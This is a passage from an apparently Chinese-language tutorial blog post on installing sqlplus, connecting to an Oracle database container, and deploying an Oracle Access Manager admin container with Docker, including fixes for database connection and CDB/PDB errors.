</span></span></code></pre></td></tr></table></div></div><h3 id=测试数据库连接>测试数据库连接<a hidden class=anchor aria-hidden=true href=#测试数据库连接>#</a></h3><h4 id=安装sqlplus>安装sqlplus<a hidden class=anchor aria-hidden=true href=#安装sqlplus>#</a></h4><p>参考https://askubuntu.com/questions/159939/how-to-install-sqlplus</p><h5 id=step1>step1:<a hidden class=anchor aria-hidden=true href=#step1>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo apt-get install alien</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=step2>step2:<a hidden class=anchor aria-hidden=true href=#step2>#</a></h5><p>在 <a href=https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html>https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html</a> 下载3个文件
oracle-instantclient12.2-basic-12.2.0.1.0-1.x86_64.rpm
oracle-instantclient12.2-sqlplus-12.2.0.1.0-1.x86_64.rpm
oracle-instantclient12.2-devel-12.2.0.1.0-1.x86_64.rpm</p><h5 id=step3>step3:<a hidden class=anchor aria-hidden=true href=#step3>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo alien -i oracle-instantclient*-basic*.rpm</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo alien -i oracle-instantclient*-sqlplus*.rpm</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo alien -i oracle-instantclient*-devel*.rpm</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=step4>step4:<a hidden class=anchor aria-hidden=true href=#step4>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo apt-get install libaio1</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=step5>step5:<a hidden class=anchor aria-hidden=true href=#step5>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo sensible-editor /etc/ld.so.conf.d/oracle.conf</span>
</span></span><span style=display:flex><span>粘贴右侧内容： /usr/lib/oracle/12.2/client64/lib/
</span></span></code></pre></td></tr></table></div></div><h5 id=step6>step6:<a hidden class=anchor aria-hidden=true href=#step6>#</a></h5><p>sudo ldconfig</p><h5 id=step7-测试链接>step7 测试链接<a hidden class=anchor aria-hidden=true href=#step7-测试链接>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sqlplus64 sys/Oradoc_db1@//127.0.0.1:1521/ORCLCDB.localdomain as sysdba</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sqlplus64 sys/Oradoc_db1@//172.17.0.1:1521/ORCLPDB1.localdomain as sysdba</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=Image.png alt=Image></p><h5 id=其他sqlplus64的用法>其他：sqlplus64的用法<a hidden class=anchor aria-hidden=true href=#其他sqlplus64的用法>#</a></h5><p>sqlplus64的用法：<code>sqlplus [ [&lt;option>] [{logon | /nolog}] [&lt;start>] ]</code></p><p>其中<code>&lt;logon></code> 是</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>{&lt;username&gt;[/&lt;password&gt;][@&lt;connect_identifier&gt;] | / } [AS {SYSDBA | SYSOPER | SYSASM | SYSBACKUP | SYSDG | SYSKM | SYSRAC}] [EDITION=value]
</span></span></code></pre></td></tr></table></div></div><p>其中<code>&lt;connect_identifier></code>可以是如下格式 <code>@[&lt;net_service_name> | [//]Host[:Port]/&lt;service_name>]</code></p><p>如何知道 service_name 或者 net_service_name？<a href=https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070>Oracle数据库容器镜像文档</a> 说<code>service_name</code>定义在环境变量TNS_ADMIN定义的目录下的tnsnames.ora文件中，
进容器看到 <code>TNS_ADMIN=/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB </code>，tnsnames.ora文件内容为</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ORCLCDB =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLCDB.localdomain)     )   )
</span></span><span style=display:flex><span>ORCLPDB1 =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLPDB1.localdomain)     )   )
</span></span></code></pre></td></tr></table></div></div><p>所以 <code>SERVICE_NAME</code> 可以是 <code>ORCLCDB.localdomain</code> 或者 <code>ORCLPDB1.localdomain</code> 。</p><h2 id=下载oam镜像>②下载OAM镜像<a hidden class=anchor aria-hidden=true href=#下载oam镜像>#</a></h2><p>进入 <a href=https://container-registry.oracle.com/>https://container-registry.oracle.com/</a> ，点击右上角Sign In，登陆自己的Oracle账号，然后点击MiddleWare，然后点击OAM。</p><p><img loading=lazy src=Image-1647622537456.png alt=Image></p><p><img loading=lazy src=Image-1647622548135.png alt=Image></p><p>在右侧区域同意协议，然后才可以下载。</p><p><img loading=lazy src=Image-1647622564727.png alt=Image></p><p>否则即使docker login，还是无法下载，会提示</p><blockquote><p>Error response from daemon: pull access denied for container-registry.oracle.com/middleware/oam, repository does not exist or may require ‘docker login’: denied: requested access to the resource is denied。</p></blockquote><p><img loading=lazy src=Image-1647622614687.png alt=Image></p><p>同意协议之后执行以下命令</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo docker login container-registry.oracle.com</span>
</span></span></code></pre></td></tr></table></div></div><p>输入在Oracle注册的账号密码</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=Image-1647622674132.png alt=Image></p><h2 id=创建容器一oamadmin>③创建容器一oamadmin<a hidden class=anchor aria-hidden=true href=#创建容器一oamadmin>#</a></h2><p>参考教程创建OAM Administration Server Container，其中包含WebLogic 和OAM Consoles.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker images
</span></span><span style=display:flex><span>sudo docker network create -d bridge OamNET
</span></span><span style=display:flex><span><span style=color:#75715e># 14f104a67b0819335f9490dadc3e4003540bcdbb7b19436b2aea56250a5f2713</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo mkdir -p /scratch/user_projects
</span></span><span style=display:flex><span>sudo chmod <span style=color:#ae81ff>777</span> /scratch/user_projects
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>password --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><p>可能会连不上，使用以下命令调试，看看错误是什么</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run --rm --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>password --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><h3 id=报错及解决>报错及解决<a hidden class=anchor aria-hidden=true href=#报错及解决>#</a></h3><h4 id=报错一无法连接数据库>报错一：无法连接数据库<a hidden class=anchor aria-hidden=true href=#报错一无法连接数据库>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Unable to connect to the database using the provided details.
</span></span><span style=display:flex><span>Enter a valid hostname and port or check if the listener is up and running
</span></span></code></pre></td></tr></table></div></div><h4 id=解决一使用正确的ip>解决一：使用正确的IP<a hidden class=anchor aria-hidden=true href=#解决一使用正确的ip>#</a></h4><p>需要注意CONNECTION_STRING是从新建的容器中访问的，所以给的IP应该是容器网卡的网关或者主机的，比如 172.17.0.1，而不是127.0.0.1。</p><h4 id=报错二无法连接cdb>报错二：无法连接CDB<a hidden class=anchor aria-hidden=true href=#报错二无法连接cdb>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>The selected Oracle database is a multitenant container database (CDB). Connecting to a multitenant container database (CDB) is not supported. Instead, connect to a valid pluggable database (PDB).
</span></span></code></pre></td></tr></table></div></div><h4 id=解决二使用pdb>解决二：使用PDB<a hidden class=anchor aria-hidden=true href=#解决二使用pdb>#</a></h4><blockquote><p>PDB和CDB是Oracle12的新特性，CDB是多租的。Oracle 数据库 12 c 多租户选项允许单个容器数据库 （CDB） 来承载多个单独的可插拔数据库 (PDB)。</p><p>——https://www.cnblogs.com/kerrycode/p/3386917.html</p></blockquote><p>使用以下语句查看自己是否是所租数据库</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>select name, decode(cdb, &#39;YES&#39;, &#39;Multitenant Option enabled&#39;, &#39;Regular 12c Database: &#39;) &#34;Multitenant Option&#34; , open_mode, con_id from v$database;
</span></span></code></pre></td></tr></table></div></div><p>结果</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>NAME      Multitenant Option         OPEN_MODE              CON_ID
</span></span><span style=display:flex><span>--------- -------------------------- -------------------- ----------
</span></span><span style=display:flex><span>ORCLCDB   Multitenant Option enabled READ WRITE            0
</span></span></code></pre></td></tr></table></div></div><p>或者直接</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>select cdb from v$database
</span></span></code></pre></td></tr></table></div></div><p>YES表示该数据库是CDB,如果是NO表示是NO-CDB(普通数据库)</p><p>或者执行</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>show pdbs;
</span></span></code></pre></td></tr></table></div></div><p>结果</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>   CON_ID CON_NAME              OPEN MODE  RESTRICTED
</span></span><span style=display:flex><span>---------- ------------------------------ ---------- ----------
</span></span><span style=display:flex><span>     2 PDB$SEED              READ ONLY  NO
</span></span></code></pre></td></tr></table></div></div><p>搜索 “how to connect to pdb directly” ，参考<a href=https://www.dell.com/support/kbdoc/zh-cn/000146485/%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5%E5%88%B0-oracle-rac-12cr1-%E4%B8%AD%E7%9A%84%E5%8F%AF%E6%8F%92%E6%8B%94%E6%95%B0%E6%8D%AE%E5%BA%93>此文</a> 想到通过新建服务连接到PDB。然后注意到<code>/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB/tnsnames.ora</code> 文件内容如下，其中已经包括两个Service。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ORCLCDB =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLCDB.localdomain)     )   )
